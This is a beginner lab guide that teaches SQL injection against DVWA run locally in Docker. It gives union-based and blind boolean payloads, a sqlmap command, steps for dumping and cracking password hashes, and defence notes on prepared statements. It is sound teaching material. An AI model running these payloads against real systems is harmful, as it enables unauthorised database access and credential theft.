# Lab 01 — SQL Injection Fundamentals

**Target:** DVWA — `http://localhost:2580`
**Profile:** `web-apps` or `full`
**Difficulty:** Beginner → Intermediate
**Estimated time:** 45–60 minutes

---

## Prerequisites

```bash
docker compose --profile web-apps up -d
```

Wait ~30 seconds, then open `http://localhost:2580`.

**Default credentials:** `admin` / `password`

After logging in, go to **DVWA Security** (left sidebar) to set the security level.

---

## Background

SQL Injection occurs when untrusted input is concatenated directly into a SQL query. A vulnerable query might look like:

```sql
SELECT * FROM users WHERE id = '$id';
```

If `$id` comes from user input without sanitisation, an attacker can break out of the string context and inject arbitrary SQL.

---

## Part 1 — Classic Union-Based Injection (Security: Low)

Set security to **Low**.

Navigate to **SQL Injection** in the left sidebar.

### 1.1 Confirm injection point

Enter `1` in the User ID field — note the output. Now try:

```
1'
```

You should see a MySQL error. The single quote broke the query syntax, confirming the input reaches the database unescaped.

### 1.2 Determine the number of columns

Use `ORDER BY` to probe the column count:

```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
```

The query errors on `ORDER BY 3`, so there are **2 columns**.

### 1.3 Find which columns are displayed

```
1' UNION SELECT NULL, NULL-- -
1' UNION SELECT 'a', NULL-- -
1' UNION SELECT NULL, 'a'-- -
```

Both columns render string data.

### 1.4 Extract database metadata

```
1' UNION SELECT database(), user()-- -
```

**Expected output:** current database name and the MySQL user running the query.

### 1.5 List all tables

```
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

You should see `users` and `guestbook`.

### 1.6 Dump the users table

```
1' UNION SELECT user, password FROM users-- -
```

The passwords are MD5 hashes. Crack one offline:

```bash
echo -n "password" | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99
```

Or use a tool like `hashcat` or an online rainbow table to recover the plaintext.

---

## Part 2 — Blind Boolean-Based Injection (Security: Low)

Navigate to **SQL Injection (Blind)**.

Blind injection means the app doesn't echo query results — you infer truth by observing whether the page changes.

### 2.1 Confirm blind injection

```
1' AND 1=1-- -    ← page shows user info (TRUE)
1' AND 1=2-- -    ← page shows nothing (FALSE)
```

### 2.2 Extract data one bit at a time

Determine the length of the current database name:

```
1' AND LENGTH(database())=4-- -
```

Extract the first character:

```
1' AND SUBSTRING(database(),1,1)='d'-- -
```

Repeat for each character. This is tedious manually — it's where tools like `sqlmap` automate the process.

### 2.3 Automate with sqlmap

From the Kali container:

```bash
docker compose --profile tools exec kali bash
sqlmap -u "http://dvwa:80/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<your-session-id>;security=low" \
  --dbs --batch
```

Replace `<your-session-id>` with your actual session cookie from the browser dev tools.

---

## Part 3 — Bypassing Medium Security

Set security to **Medium**.

The form now uses a dropdown, and the backend uses `mysql_real_escape_string()` on the input. You can't inject via the UI — but you can manipulate the POST request directly.

Use the browser dev tools or a proxy (ZAP / Burp) to intercept the request and change the `id` parameter to:

```
1 UNION SELECT user, password FROM users-- -
```

(No quotes needed — the parameter is cast as an integer in the query, so there's no string context to escape.)

---

## Part 4 — High Security

Set security to **High**.

The input is now processed in a separate session via a second request to limit automated scanning. Inspect the source at `http://localhost:2580/vulnerabilities/sqli/session-input.php`.

The injection point still exists; the defence is purely rate-limiting tooling. Manual payloads through the session input form still work:

```
1' UNION SELECT user, password FROM users-- -
```

---

## Defence Notes

| Weak (vulnerable) | Strong (secure) |
|---|---|
| String concatenation | Prepared statements / parameterised queries |
| `mysql_real_escape_string()` | PDO / MySQLi with bound parameters |
| Blocklists for `'`, `--` | Allowlist input validation + ORM |
| Displaying raw errors | Generic error messages; log details server-side |

**Correct pattern in PHP:**

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

---

## Next Steps

- Lab 02: [API Security — OWASP API Top 10 with VAmPI](./02-api-owasp-top10-vampi.md)
- Try the same techniques against **bWAPP** (`http://localhost:2583`) — it has over 100 injection variants
